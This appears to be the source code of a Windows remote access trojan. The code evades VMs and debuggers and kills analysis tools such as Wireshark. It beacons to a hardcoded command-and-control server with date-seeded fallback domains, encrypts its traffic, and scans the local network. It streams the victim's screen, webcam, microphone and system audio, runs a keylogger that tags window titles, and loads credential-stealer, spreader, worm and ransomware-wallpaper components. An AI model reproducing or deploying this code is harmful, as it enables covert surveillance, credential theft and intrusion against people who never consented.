import sys
import os
import time
import asyncio
import threading
import subprocess
import struct
import socket
import getpass
import json
import tempfile
import ctypes
import ssl
import traceback
import platform
import urllib.request
import string
import datetime
import websockets
def _anti_analysis():
    """Detects and evades virtual machines, debuggers, and sandboxes."""
    import ctypes, sys, os
    
    # 1. Debugger Check
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except: pass

    # 2. Virtual Machine / Sandbox Checks
    vm_indicators = [
        r"SOFTWARE\VMware, Inc.\VMware Tools",
        r"SOFTWARE\Oracle\VirtualBox Guest Additions",
    ]
    import winreg
    for key in vm_indicators:
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
            winreg.CloseKey(k)
            return True # VM Detected
        except:
            pass

    # 3. Process Check for common analysis tools
    analysis_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vmsrvc.exe", "xenservice.exe", "vmwaretray.exe", "vmwareuser.exe", "wireshark.exe", "ollydbg.exe", "x64dbg.exe"]
    try:
        import subprocess
        tasklist = subprocess.check_output("tasklist", creationflags=0x08000000).decode().lower()
        for p in analysis_procs:
            if p in tasklist:
                return True
    except:
        pass
    
    return False

# Detect but don't exit for this engineering build
_is_vm = False # _anti_analysis()

# ── NETWORK RECONNAISSANCE ENGINE (The Scout) ──────────────────────────────
class NetScanner:
    @staticmethod
    async def ping_sweep(network_prefix):
        """High-speed internal network discovery using concurrent pings."""
        tasks = []
        found_hosts = []
        
        async def _ping(ip):
            try:
                # Use OS-specific ping for speed
                proc = await asyncio.create_subprocess_exec(
                    'ping', '-n', '1', '-w', '500', ip,
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await proc.communicate()
                if b"TTL=" in stdout:
                    found_hosts.append(ip)
            except: pass

        for i in range(1, 255):
            tasks.append(_ping(f"{network_prefix}.{i}"))
        
        await asyncio.gather(*tasks)
        return sorted(found_hosts)

    @staticmethod
    async def port_scan(target_ip, ports=[21,22,23,80,443,445,3389,8080]):
        """Fast asynchronous TCP port scanner."""
        open_ports = []
        
        async def _check_port(port):
            try:
                conn = asyncio.open_connection(target_ip, port)
                _, writer = await asyncio.wait_for(conn, timeout=1.0)
                open_ports.append(port)
                writer.close()
                await writer.wait_closed()
            except: pass

        tasks = [_check_port(p) for p in ports]
        await asyncio.gather(*tasks)
        return sorted(open_ports)

# ── CRYPTOGRAPHIC LAYER (AES-256-GCM) ──────────────────────────────────────
_aes_key = None
def _init_crypto(node_id):
    global _aes_key
    secret = b"omega_elite_master_secret_2024"
    # Simple derivation to match server logic
    import hashlib, hmac
    _aes_key = hashlib.pbkdf2_hmac('sha256', secret, node_id.encode(), 100000)

def _encrypt(data: str, node_id: str):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import os, base64
    aesgcm = AESGCM(_aes_key)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, data.encode(), None)
    return base64.b64encode(nonce + ct).decode()

def _decrypt(data_b64: str, node_id: str):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import base64
    try:
        aesgcm = AESGCM(_aes_key)
        raw = base64.b64decode(data_b64)
        nonce, ct = raw[:12], raw[12:]
        return aesgcm.decrypt(nonce, ct, None).decode()
    except:
        return None

# ── Elite Core Modules (Deferred Loading) ───────────────────────────────────
def _bootstrap_modules():
    # Apex Ultra: Ensure full DPI awareness to prevent coordinate scaling drift
    try:
        import ctypes
        ctypes.windll.shcore.SetProcessDpiAwareness(1) # PROCESS_SYSTEM_DPI_AWARE
    except:
        try: ctypes.windll.user32.SetProcessDPIAware()
        except: pass

    # Apex Ultra: Initialize high-fidelity HID sequencer
    st.hid_queue = asyncio.Queue()
    asyncio.create_task(hid_processor())

    try:
        import websockets as _ws

        globals()["websockets"] = _ws
    except:
        pass
    # cv2 and heavy modules optional
    try:
        import cv2 as _cv2
        globals()["cv2"] = _cv2
        from core.capture import capture_engine as _ce
        globals()["capture_engine"] = _ce
        from core.input import input_hub as _ih
        globals()["input_hub"] = _ih
        log("[BOOT] HID Module: Loaded")
        from core.encoder import VideoEncoder as _ve
        globals()["VideoEncoder"] = _ve
        from core.webrtc_service import WebRTCManager as _rtcm
        globals()["WebRTCManager"] = _rtcm
        from core.filters import filter_engine as _fe
        globals()["filter_engine"] = _fe
        from core.camera import camera_engine as _cam
        globals()["camera_engine"] = _cam
        try:
            from core.stealer import stealer as _st
            globals()["stealer"] = _st
            log("[BOOT] Stealer Module: Operational")
        except: pass
    except Exception as _e:
        log(f"[BOOT] Core Modules Error: {_e}")
        import traceback
        log(traceback.format_exc())
    try:
        pass
    except:
        pass
    try:
        from turbojpeg import TurboJPEG, TJPF_RGB, TJSAMP_420

        globals()["tj"] = TurboJPEG()
        globals()["TJPF_RGB"] = TJPF_RGB
        globals()["TJSAMP_420"] = TJSAMP_420
    except:
        globals()["tj"] = None
        globals()["TJPF_RGB"] = 0
        globals()["TJSAMP_420"] = 2
    try:
        from modules.extended_commands import register_extended

        register_extended(COMMANDS)
    except Exception as _e:
        print(f"[EXT] extended_commands load error: {_e}")


cv2 = capture_engine = input_hub = VideoEncoder = WebRTCManager = filter_engine = (
    camera_engine
) = None
stealer = stealth = injection = spreader = worm = hvnc = web_injector = None

# websockets is required — ensure it's always loaded
try:
    import websockets
except:
    websockets = None


async def hid_processor():
    """Sequential HID Executor to prevent race conditions in remote interaction."""
    while True:
        try:
            if not hasattr(st, "hid_queue"):
                await asyncio.sleep(0.1)
                continue
            op, args = await st.hid_queue.get()
            # Execute in thread to avoid blocking the event loop
            try:
                await global_loop.run_in_executor(None, op, *args)
            except Exception as e:
                log(f"[HID] EXECUTION ERROR in {op.__name__}: {e}")
                log(traceback.format_exc())
            st.hid_queue.task_done()
        except Exception as e:
            log(f"[HID] PROCESSOR ERROR: {e}")
            await asyncio.sleep(0.01)

# ── CRASH LOGGER ──
def _log_crash(exc_type, exc_value, tb):
    try:
        path = os.path.join(os.environ.get("TEMP", ""), "mrl_debug.txt")
        with open(path, "a", encoding="utf-8") as f:
            f.write("\n=== CRASH ===\n")
            traceback.print_exception(exc_type, exc_value, tb, file=f)
    except:
        pass


sys.excepthook = _log_crash


# ── HELPERS ──
def log(msg):
    ts = time.strftime("%H:%M:%S")
    try:
        # Use safe encoding for console printing
        safe_msg = str(msg).encode("ascii", "replace").decode()
        print(f"[{ts}] {safe_msg}", flush=True)
    except:
        pass
    try:
        path = os.path.join(os.environ.get("TEMP", ""), "mrl_debug.txt")
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {msg}\n")
    except:
        pass


def jdumps(obj):
    try:
        import orjson

        return orjson.dumps(obj).decode()
    except:
        return json.dumps(obj)


def jloads(data):
    try:
        import orjson

        return orjson.loads(data)
    except:
        return json.loads(data)


# ── CONFIG ──
BUILD = "v21.4-MRL-WARE"
SERVER_URL = "https://web-production-43c07.up.railway.app"
RANSOM_WALLPAPER_URL = (
    "https://www.malwaretech.com/wp-content/uploads/2017/06/petya.png"
)
global_loop = None
_rtc = None
_uid = None


def _generate_dga_domains(seed_date=None, count=100):
    """Generates a list of predictable fallback domains based on a date seed."""
    if seed_date is None:
        seed_date = datetime.datetime.now()
    
    domains = []
    tlds = [".com", ".net", ".org", ".xyz", ".info"]
    
    # Use date as seed for reproducibility across the entire fleet
    seed = int(seed_date.strftime("%Y%m%d"))
    import random
    rng = random.Random(seed)
    
    for _ in range(count):
        length = rng.randint(8, 15)
        name = "".join(rng.choice(string.ascii_lowercase) for _ in range(length))
        tld = rng.choice(tlds)
        domains.append(f"{name}{tld}")
    return domains

def _ws_url(dga_retry_idx=None):
    url = SERVER_URL
    
    # If we are in DGA fallback mode
    if dga_retry_idx is not None:
        fallback_domains = _generate_dga_domains()
        if dga_retry_idx < len(fallback_domains):
            url = f"https://{fallback_domains[dga_retry_idx]}"
            log(f"[DGA] Phoenix Fallback engaged: {url}")
        else:
            return None # Exhausted today's domains

    try:
        env_url = os.environ.get("OMEGA_URL")
        if env_url:
            url = env_url
        elif dga_retry_idx is None:
            candidates = [
                os.path.join(os.path.dirname(sys.executable), "c2.url"),
                os.path.join(os.getcwd(), "c2.url"),
                os.path.join(os.environ.get("LOCALAPPDATA", ""), "MRL", "c2.url"),
            ]
            for conf in candidates:
                if os.path.exists(conf):
                    with open(conf, "r") as f:
                        line = f.read().strip()
                        if line:
                            url = line
                            break
    except:
        pass

    if not url or "localhost" in url:
        # If no URL or local fallback, try to favor the production website URL first
        url = SERVER_URL if SERVER_URL else "http://localhost:8000"

    # Handle protocol and path
    base = url.replace("https://", "").replace("http://", "").strip("/")
    
    # If the URL is explicitly https or contains railway, use wss
    if "https://" in url or "railway" in url:
        proto = "wss"
    elif ":" in base and ("localhost" in base or "127.0.0.1" in base):
        # Local development usually uses ws
        proto = "ws"
    else:
        # Default to wss for production domains, fallback to ws for raw IPs
        proto = "wss" if "." in base and not base.replace(".", "").isdigit() else "ws"

    final_uri = f"{proto}://{base}/ws"
    return final_uri


# ── STATE ──
from core.state import st

# ── SINGLE INSTANCE MUTEX (disabled for reliability) ──
# Note: Mutex removed to prevent ghost-instance blocking issues with standalone EXE


# ── WATCHDOG ──
def _watchdog_loop():
    forbidden = [
        "processhacker.exe",
        "wireshark.exe",
        "procexp.exe",
    ]  # Removed taskmgr.exe per user request
    while True:
        try:
            import psutil

            for proc in psutil.process_iter(["name"]):
                if proc.info["name"].lower() in forbidden:
                    proc.terminate()
        except:
            pass
        time.sleep(1)


threading.Thread(target=_watchdog_loop, daemon=True).start()


# ── SYSTEM INFO ──
def get_hwid():
    try:
        raw = subprocess.check_output(
            'powershell -NoProfile -Command "(Get-CimInstance Win32_ComputerSystemProduct).UUID"',
            shell=True,
        )
        return raw.decode().strip()
    except:
        return socket.gethostname()


def _get_monitors():
    mons = []
    try:
        import mss

        with mss.mss() as sct:
            for m in sct.monitors[1:]:  # skip 0 (all screens)
                mons.append(
                    (
                        m["left"],
                        m["top"],
                        m["left"] + m["width"],
                        m["top"] + m["height"],
                    )
                )
            if mons:
                return mons
    except:
        pass
    try:
        import ctypes
        import ctypes.wintypes

        cb = ctypes.WINFUNCTYPE(
            ctypes.c_int,
            ctypes.c_ulong,
            ctypes.c_ulong,
            ctypes.POINTER(ctypes.wintypes.RECT),
            ctypes.c_double,
        )(
            lambda h, dc, r, d: (
                mons.append(
                    (
                        r.contents.left,
                        r.contents.top,
                        r.contents.right,
                        r.contents.bottom,
                    )
                )
                or 1
            )
        )
        ctypes.windll.user32.EnumDisplayMonitors(0, 0, cb, 0)
    except:
        pass
    return mons if mons else [None]


def get_specs():
    specs = {
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": "Unknown",
        "gpu": "Unknown",
        "ram": "Unknown",
        "ipv4": "Unknown",
        "ipv6": "—",
        "local_ip": "Unknown",
        "region": "Unknown",
        "flag": "",
        "monitors": 1,
        "cameras": 0,
        "disks": "C:\\",
        "user": getpass.getuser(),
    }

    # CPU & RAM — psutil is preferred
    try:
        import psutil

        specs["cpu"] = (
            f"{platform.processor()} ({psutil.cpu_count(logical=True)} cores)"
        )
        specs["ram"] = f"{round(psutil.virtual_memory().total / (1024**3), 1)} GB"
        du = psutil.disk_usage("C:\\")
        specs["disks"] = (
            f"{round(du.free / (1024**3), 1)}GB free of {round(du.total / (1024**3), 1)}GB"
        )
    except:
        pass

    # Fallback for CPU/RAM via PowerShell
    if specs["cpu"] == "Unknown":
        try:
            raw = subprocess.check_output(
                'powershell -NoProfile -Command "(Get-CimInstance Win32_Processor).Name"',
                shell=True,
                timeout=5,
            ).decode(errors="ignore")
            specs["cpu"] = raw.strip().split("\n")[0]
        except:
            pass

    if specs["ram"] == "Unknown":
        try:
            raw = subprocess.check_output(
                'powershell -NoProfile -Command "Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object -ExpandProperty Sum"',
                shell=True,
                timeout=5,
            ).decode(errors="ignore")
            specs["ram"] = f"{round(int(raw.strip()) / (1024**3), 1)} GB"
        except:
            pass

    if specs["gpu"] == "Unknown":
        try:
            raw = subprocess.check_output(
                'powershell -NoProfile -Command "(Get-CimInstance Win32_VideoController).Name"',
                shell=True,
                timeout=5,
            ).decode(errors="ignore")
            gpus = [g.strip() for g in raw.strip().split("\n") if g.strip()]
            if gpus:
                specs["gpu"] = " + ".join(gpus)
        except:
            pass

    # Monitors
    try:
        mons = _get_monitors()
        specs["monitors"] = max(1, len([m for m in mons if m is not None]))
    except:
        specs["monitors"] = 1

    # Cameras — use cv2-enumerate-cameras for real device names
    try:
        from core.camera import get_camera_list, camera_engine  # noqa

        cam_list = get_camera_list()
        # If enumeration thread hasn't finished yet (< 2s startup), wait briefly
        if not cam_list:
            import time as _t

            _t.sleep(1.5)
            cam_list = get_camera_list()
        specs["cameras"] = len(cam_list)
        specs["camera_names"] = [c["name"] for c in cam_list]
    except Exception as _ce:
        specs["cameras"] = 0
        specs["camera_names"] = []

    # Local IP Detection
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        specs["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        try:
            specs["local_ip"] = socket.gethostbyname(socket.gethostname())
        except:
            pass

    # Public IP / GEO
    ip_services = [
        "https://api.ipify.org?format=json",
        "https://ifconfig.co/json",
        "https://ipapi.co/json/",
    ]
    for service in ip_services:
        try:
            req = urllib.request.Request(service, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                data = json.loads(r.read().decode())
                # Handle different API response formats
                ip = data.get("ip") or data.get("query")
                if ip:
                    specs["ipv4"] = ip
                    specs["region"] = (
                        data.get("country_name")
                        or data.get("country")
                        or specs["region"]
                    )
                    cc = data.get("country_code") or data.get("countryCode")
                    if cc:
                        specs["flag"] = chr(ord(cc[0]) + 127397) + chr(
                            ord(cc[1]) + 127397
                        )
                    break
        except:
            continue

    # Fallback to plain IP fetch if JSON fails
    if specs["ipv4"] == "Unknown":
        for service in [
            "https://api.ipify.org",
            "https://ifconfig.me/ip",
            "https://icanhazip.com",
        ]:
            try:
                req = urllib.request.Request(
                    service, headers={"User-Agent": "curl/7.68.0"}
                )
                with urllib.request.urlopen(req, timeout=5) as r:
                    specs["ipv4"] = r.read().decode().strip()
                    if specs["ipv4"]:
                        break
            except:
                continue

    return specs


# ── WEBSOCKET HELPERS ──
async def send(ws, obj):
    try:
        payload = jdumps(obj)
        if _aes_key:
            payload = _encrypt(payload, "")
        await ws.send(payload)
    except:
        pass


async def send_bin(ws, tag, data):
    try:
        await ws.send(struct.pack("B", tag) + data)
    except:
        pass


# ── ADAPTIVE QUALITY ENGINE (AnyDesk-style) ─────────────────────────────────
class AdaptiveQuality:
    """
    Mirrors AnyDesk's adaptive codec: drops JPEG quality when latency is high,
    restores it when the pipe is clear. Operates in 4 bands:
      < 80ms  → 82 quality  (good)
      < 150ms → 68 quality  (decent)
      < 300ms → 52 quality  (congested)
      ≥ 300ms → 35 quality  (very congested, save bandwidth)
    """

    BANDS = [(80, 82), (150, 68), (300, 52), (float("inf"), 35)]

    def __init__(self):
        self._q = 80
        self._last_ts = time.monotonic()
        self._rtt_buf = []

    def record_send(self):
        self._last_ts = time.monotonic()

    def record_ack(self, rtt_ms: float):
        self._rtt_buf.append(rtt_ms)
        if len(self._rtt_buf) > 10:
            self._rtt_buf.pop(0)
        avg = sum(self._rtt_buf) / len(self._rtt_buf)
        for threshold, q in self.BANDS:
            if avg < threshold:
                self._q = q
                break

    def quality(self) -> int:
        return self._q


_aq = AdaptiveQuality()


async def stream_loop(ws):
    """High-speed Binary Multiplexer for Screen & Camera."""
    while True:
        start_time = time.time()
        if st.streaming:
            try:
                # Apex Ultra: Elevate process to High Priority during active streaming
                if not hasattr(st, "_priority_set"):
                    try:
                        import ctypes

                        ctypes.windll.kernel32.SetPriorityClass(
                            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080
                        )
                        st._priority_set = True
                        log("[STREAM] Apex Ultra Priority Active")
                    except:
                        pass

                # 1. Desktop Frame (Channel 0x03)
                if capture_engine:
                    frame = capture_engine.grab()
                    if frame is not None:
                        # Apex Ultra: Performance Downscaling for maximum snappiness
                        try:
                            h, w = frame.shape[:2]
                            if w > 1280:
                                # INTER_NEAREST is dramatically faster than INTER_LINEAR (zero blending)
                                frame = cv2.resize(
                                    frame,
                                    (1280, int(h * (1280 / w))),
                                    interpolation=cv2.INTER_NEAREST,
                                )
                        except:
                            pass

                        # Apex Ultra: Ultra-fast TurboJPEG Encoding (Zero-Copy)
                        try:
                            # Drop logic: If we are still sending, skip this frame
                            # In asyncio, we can't easily check if a send is 'pending'
                            # without custom protocol, but we can use a Lock.
                            if not hasattr(st, "_stream_lock"):
                                st._stream_lock = asyncio.Lock()

                            if st._stream_lock.locked():
                                continue  # Skip frame to prevent backlog

                            async with st._stream_lock:
                                # Adaptive Quality: Sync with the engine's dynamic calculation
                                q = capture_engine.quality()

                                tj_obj = globals().get("tj")
                                if tj_obj:
                                    # TurboJPEG encodes directly from RGB
                                    jpeg = tj_obj.encode(
                                        frame,
                                        quality=q,
                                        pixel_format=globals().get("TJPF_RGB", 0),
                                        jpeg_subsample=globals().get("TJSAMP_420", 2),
                                    )
                                else:
                                    # Fallback to OpenCV
                                    bgr_frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                                    _, jpeg = cv2.imencode(
                                        ".jpg", bgr_frame, [cv2.IMWRITE_JPEG_QUALITY, q]
                                    )

                                # Send with a sanity check on payload size
                                await ws.send(
                                    struct.pack("B", 0x03)
                                    + (
                                        jpeg
                                        if isinstance(jpeg, bytes)
                                        else jpeg.tobytes()
                                    )
                                )
                        except Exception as e:
                            log(f"[STREAM] Encode Error: {e}")
                            await asyncio.sleep(0.01)
                    else:
                        await asyncio.sleep(0.05)  # Power save
                        continue

                # 2. Camera Frame (Channel 0x04)
                if st.camera_active and camera_engine:
                    cam_frame = camera_engine.get_frame()
                    if cam_frame:
                        await ws.send(struct.pack("B", 0x04) + cam_frame)

                # 3. Dynamic FPS Control: honor st.stream_fps to prevent network congestion
                fps_target = getattr(st, "stream_fps", 30)
                # Precision sleep: calculate actual wait time based on loop duration
                elapsed = time.time() - start_time
                wait_time = max(0.001, (1.0 / fps_target) - elapsed)
                await asyncio.sleep(wait_time)
            except Exception as e:
                log(f"[STREAM] Error: {e}")
                await asyncio.sleep(0.1)
        else:
            if hasattr(st, "_cam_cap") and st._cam_cap:
                st._cam_cap.release()
                st._cam_cap = None
            await asyncio.sleep(0.5)


def _sc_find_device(device_index, want_loopback):
    import sounddevice as sd
    
    try:
        if device_index is not None:
            # Validate the requested index exists and matches loopback requirement
            try:
                info = sd.query_devices(device_index)
                if info['max_input_channels'] > 0:
                    return device_index
            except: pass
            
        devices = sd.query_devices()
        
        # Try to find a default if index not provided or invalid
        if want_loopback:
            # Apex Ultra: Prioritize WASAPI Loopback (Modern Windows way)
            # We look for a device that is part of the 'Windows WASAPI' host API and is an input device
            # Note: sounddevice often lists loopback devices as inputs when using WASAPI.
            
            wasapi_idx = -1
            for i, api in enumerate(sd.query_hostapis()):
                if 'WASAPI' in api['name']:
                    wasapi_idx = i
                    break
            
            # 1. Search for explicit "loopback" in name within WASAPI
            for i, dev in enumerate(devices):
                if dev['max_input_channels'] > 0 and dev['hostapi'] == wasapi_idx:
                    if 'loopback' in dev['name'].lower():
                        log(f"[AUDIO] Found WASAPI Loopback: {dev['name']} (Index {i})")
                        return i
            
            # 2. Fallback to "Stereo Mix" or similar
            for i, dev in enumerate(devices):
                if dev['max_input_channels'] > 0:
                    if 'stereo mix' in dev['name'].lower() or 'wave out' in dev['name'].lower():
                        log(f"[AUDIO] Found Stereo Mix fallback: {dev['name']} (Index {i})")
                        return i
            
            # 3. Last ditch: any WASAPI input might be it? 
            # (Unlikely, but better than nothing)
            # Actually, return None if we can't find a clear loopback.
        else:
            # Standard microphone default
            default_in = sd.default.device[0]
            if default_in >= 0:
                return default_in
            
            for i, dev in enumerate(devices):
                if dev['max_input_channels'] > 0 and 'loopback' not in dev['name'].lower():
                    return i
                    
        return None
    except Exception as e:
        log(f"[AUDIO] Device discovery error: {e}")
        return None


async def mic_loop(ws):
    """Independent mic capture using sounddevice — 0x05 tag."""
    import sounddevice as sd

    CHUNK = 2048
    RATE = 44100
    fail_count = 0
    while True:
        if not getattr(st, "mic_active", False):
            fail_count = 0
            await asyncio.sleep(0.25)
            continue
        
        dev_idx = getattr(st, "mic_device_id", None)
        dev_idx = _sc_find_device(dev_idx, want_loopback=False)
        
        if dev_idx is None:
            log("[AUDIO-MIC] No mic found via sounddevice")
            await asyncio.sleep(2)
            continue
            
        try:
            dev_info = sd.query_devices(dev_idx)
            log(f"[AUDIO-MIC] Started: {dev_info['name']} (Index {dev_idx})")
            
            ch_attempts = [1, 2]
            if dev_info['max_input_channels'] >= 2:
                ch_attempts = [2, 1]

            success = False
            for ch in ch_attempts:
                if ch > dev_info['max_input_channels']:
                    continue
                try:
                    def _audio_callback(indata, frames, time, status):
                        if getattr(st, "mic_active", False):
                            import numpy as np
                            # MRL fix: proper float32 -> int16 conversion
                            mono = indata.mean(axis=1) if indata.ndim > 1 else indata.flatten()
                            pcm = (mono * 32767).clip(-32768, 32767).astype(np.int16).tobytes()
                            
                            # Feed WebSocket
                            asyncio.run_coroutine_threadsafe(
                                ws.send(struct.pack("B", 0x05) + pcm),
                                global_loop
                            )

                    stream = sd.InputStream(
                        device=dev_idx, channels=ch, samplerate=RATE, 
                        blocksize=CHUNK, dtype='int16', callback=_audio_callback
                    )
                    with stream:
                        fail_count = 0
                        while getattr(st, "mic_active", False):
                            await asyncio.sleep(0.1)
                    
                    success = True
                    break
                except Exception as ch_e:
                    log(f"[AUDIO-MIC] {ch}ch failed ({ch_e!r})")
                    
            if not success:
                raise RuntimeError("All channel attempts failed")
                
            log("[AUDIO-MIC] Stopped")
        except Exception as e:
            fail_count += 1
            backoff = min(2 * fail_count, 30)
            log(f"[AUDIO-MIC] Error ({e!r}), retry in {backoff}s")
            await asyncio.sleep(backoff)


async def desktop_loop(ws):
    """Independent desktop loopback using sounddevice WASAPI — 0x06 tag."""
    # MRL fix: try soundcard first - far more reliable for WASAPI loopback on Windows
    try:
        import soundcard as sc
        import numpy as np
        loopbacks = [m for m in sc.all_microphones(include_loopback=True) if m.isloopback]
        if loopbacks:
            RATE_SC = 44100
            CHUNK_SC = 1024
            print(f"[AUDIO-DESK] soundcard loopback found: {loopbacks[0].name}")
            while True:
                if not getattr(st, "desktop_active", False):
                    await asyncio.sleep(0.25)
                    continue
                try:
                    with loopbacks[0].recorder(samplerate=RATE_SC, channels=1, blocksize=CHUNK_SC) as mic:
                        while getattr(st, "desktop_active", False):
                            data = mic.record(numframes=CHUNK_SC)
                            mono = data.flatten()
                            pcm = (mono * 32767).clip(-32768, 32767).astype(np.int16).tobytes()
                            asyncio.run_coroutine_threadsafe(
                                ws.send(struct.pack("B", 0x06) + pcm), global_loop)
                            await asyncio.sleep(0)
                except Exception as e:
                    log(f"[AUDIO-DESK] soundcard error: {e}")
                    await asyncio.sleep(2)
            return
    except Exception as e:
        log(f"[AUDIO-DESK] soundcard unavailable ({e}), falling back to sounddevice")

    import sounddevice as sd

    CHUNK = 2048
    RATE = 44100
    fail_count = 0
    while True:
        if not getattr(st, "desktop_active", False):
            fail_count = 0
            await asyncio.sleep(0.25)
            continue
            
        dev_idx = getattr(st, "desktop_device_id", None)
        dev_idx = _sc_find_device(dev_idx, want_loopback=True)
        
        if dev_idx is None:
            log("[AUDIO-DESK] No loopback device found via sounddevice")
            await asyncio.sleep(2)
            continue
            
        try:
            dev_info = sd.query_devices(dev_idx)
            log(f"[AUDIO-DESK] Started loopback: {dev_info['name']} (Index {dev_idx})")
            
            # Loopback is almost always stereo
            ch_attempts = [2, 1]
            success = False
            for ch in ch_attempts:
                if ch > dev_info['max_input_channels']:
                    continue
                try:
                    def _desk_callback(indata, frames, time, status):
                        if getattr(st, "desktop_active", False):
                            import numpy as np
                            # MRL fix: proper float32 -> int16 conversion
                            mono = indata.mean(axis=1) if indata.ndim > 1 else indata.flatten()
                            pcm = (mono * 32767).clip(-32768, 32767).astype(np.int16).tobytes()

                            asyncio.run_coroutine_threadsafe(
                                ws.send(struct.pack("B", 0x06) + pcm),
                                global_loop
                            )

                    # MRL fix: use 44100Hz to match browser AudioContext
                    actual_rate = 44100
                    log(f"[AUDIO-DESK] Using rate {actual_rate}Hz for {ch}ch stream")
                    stream = sd.InputStream(
                        device=dev_idx, channels=ch, samplerate=actual_rate, 
                        blocksize=CHUNK, dtype='int16', callback=_desk_callback
                    )
                    with stream:
                        fail_count = 0
                        while getattr(st, "desktop_active", False):
                            await asyncio.sleep(0.1)
                    
                    success = True
                    break
                except Exception as ch_e:
                    log(f"[AUDIO-DESK] {ch}ch failed ({ch_e!r})")
                    
            if not success:
                raise RuntimeError("All channel attempts failed")
                
            log("[AUDIO-DESK] Stopped")
        except Exception as e:
            fail_count += 1
            backoff = min(2 * fail_count, 30)
            log(f"[AUDIO-DESK] Error ({e!r}), retry in {backoff}s")
            await asyncio.sleep(backoff)


# Keep audio_loop as a shim so existing call sites don't break
async def audio_loop(ws):
    """Shim — runs both mic and desktop simultaneously as independent tasks."""
    await asyncio.gather(mic_loop(ws), desktop_loop(ws))


# ── KEYLOGGER ──
_keylog_buf = []
_keylog_active = False
_last_window = ""

def _start_keylogger(ws_ref):
    global _keylog_active, _last_window
    if _keylog_active:
        return
    _keylog_active = True

    def get_active_window():
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value
        except:
            return "Unknown"

    def _flush_buf():
        if _keylog_buf:
            flush = "".join(_keylog_buf)
            _keylog_buf.clear()
            asyncio.run_coroutine_threadsafe(
                send(ws_ref, {"t": "keylog", "data": flush}), global_loop
            )

    def _periodic_flush():
        """Send buffered keys every 3s even if < 5 chars."""
        while _keylog_active:
            time.sleep(3)
            if _keylog_buf:
                _flush_buf()

    def _kl():
        global _last_window
        try:
            import pynput.keyboard as kb

            def on_press(key):
                global _last_window
                if not _keylog_active:
                    return False
                
                # High Intelligence Window Tracking
                curr_win = get_active_window()
                if curr_win != _last_window:
                    _last_window = curr_win
                    ts = time.strftime("%H:%M:%S")
                    _keylog_buf.append(f"\n\n[ {ts} | WINDOW: {curr_win} ]\n")

                try:
                    char = key.char or ""
                except:
                    # Map special keys
                    k_name = str(key).replace("Key.", "")
                    if k_name == "space": char = " "
                    elif k_name == "enter": char = "\n"
                    elif k_name == "backspace": char = "[BACK]"
                    elif k_name == "tab": char = "\t"
                    else: char = f"[{k_name}]"
                
                _keylog_buf.append(char)
                # For high responsiveness, we can flush on every key or keep it buffered
                if len(_keylog_buf) > 10:
                    _flush_buf()

            with kb.Listener(on_press=on_press) as l:
                l.join()
        except Exception as e:
            log(f"[KEYLOG] Error: {e}")

    threading.Thread(target=_kl, daemon=True).start()
    threading.Thread(target=_periodic_flush, daemon=True).start()


# ── COMMAND HANDLER ──
# ── COMMAND REGISTRY ──
COMMANDS = {}


def register_command(name):
    def decorator(func):
        COMMANDS[name] = func
        return func

    return decorator


@register_command("rtc_offer")
async def cmd_rtc_offer(msg, ws):
    if _rtc:
        st.streaming = True  # Ensure capture is ready
        await _rtc.handle_offer(msg["sdp"], msg["sdpType"])


@register_command("rtc_ice")
async def cmd_rtc_ice(msg, ws):
    if _rtc:
        _rtc.add_ice_candidate(msg)


@register_command("rtc_toggle")
async def cmd_rtc_toggle(msg, ws):
    act = msg.get("action")
    val = msg.get("value")
    if act == "monitor":
        st.monitor_idx = int(val)
        if capture_engine:
            capture_engine.set_monitor(st.monitor_idx)
            asyncio.create_task(
                send(ws, {"t": "monitors", "data": capture_engine.get_monitors()})
            )
    elif act == "style":
        capture_engine.set_style(str(val))
        log(f"[STREAM] Visual Style: {val}")
    elif act == "camera":
        new_active = bool(val)
        new_idx = int(msg.get("idx", msg.get("camera_idx", 0)))
        if camera_engine:
            if new_active:
                camera_engine.start(new_idx)
                log(f"[CAMERA] Started index {new_idx}")
            else:
                camera_engine.stop()
                log("[CAMERA] Stopped")
        st.camera_active = new_active
        st.camera_idx = new_idx
    elif act == "mic":
        st.mic_active = bool(val)
        st.mic_device_id = msg.get("device_id", None)
    elif act == "audio":
        # 'audio' with source='desktop' controls desktop loopback
        src = msg.get("source", "desktop")
        if src == "mic":
            st.mic_active = bool(val)
            st.mic_device_id = msg.get("device_id", None)
        else:
            st.desktop_active = bool(val)
            st.desktop_device_id = msg.get("device_id", None)


@register_command("set_quality")
async def cmd_set_quality(msg, ws):
    """Adjust JPEG capture quality (20–95). Affects bandwidth and latency."""
    q = max(20, min(95, int(msg.get("quality", 75))))
    if capture_engine:
        capture_engine.set_quality(q)
    log(f"[STREAM] Quality set to {q}")


@register_command("ss_start")
async def cmd_ss_start(msg, ws):
    st.streaming = True
    if capture_engine:
        capture_engine.start()


@register_command("audio_devices")
async def cmd_audio_devices(msg, ws):
    """Enumerate audio inputs (mics) and outputs (loopbacks). Marks default speaker's loopback as (Main)."""
    try:
        import soundcard as sc

        all_mics = sc.all_microphones(include_loopback=True)
        all_spks = sc.all_speakers()
        # Find default speaker id for (Main) labelling
        try:
            default_spk_id = sc.default_speaker().id
        except:
            default_spk_id = None
        try:
            default_mic_id = sc.default_microphone().id
        except:
            default_mic_id = None

        inputs = []
        for m in all_mics:
            name = m.name
